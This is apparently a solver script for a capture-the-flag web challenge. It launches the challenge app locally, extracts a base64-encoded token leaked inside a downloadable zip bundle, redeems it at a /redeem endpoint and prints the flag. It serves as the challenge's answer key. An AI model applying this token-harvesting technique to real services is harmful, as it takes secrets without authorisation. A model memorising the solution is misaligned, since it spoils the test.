#!/usr/bin/env python3
from __future__ import annotations

import base64
import io
import os
import re
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path
from zipfile import ZipFile


def start(app: Path, port: int):
    env = os.environ.copy()
    env['PORT'] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(80):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit('server not ready')


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / 'docker' / 'app.py', 18102)
    try:
        data = urllib.request.urlopen('http://127.0.0.1:18102/download/preview-bundle.zip').read()
        token = None
        with ZipFile(io.BytesIO(data)) as zf:
            for name in zf.namelist():
                text = zf.read(name).decode('utf-8', errors='ignore')
                match = re.search(r'preview token fragment saved as:\s*([A-Za-z0-9+/=]+)', text)
                if match:
                    token = base64.b64decode(match.group(1)).decode()
                    break
        if not token:
            raise SystemExit('token not found')
        body = urllib.request.urlopen(f'http://127.0.0.1:18102/redeem?token={urllib.parse.quote(token)}').read().decode()
        match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
        if not match:
            raise SystemExit('flag not found')
        print(match.group(0))
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == '__main__':
    main()
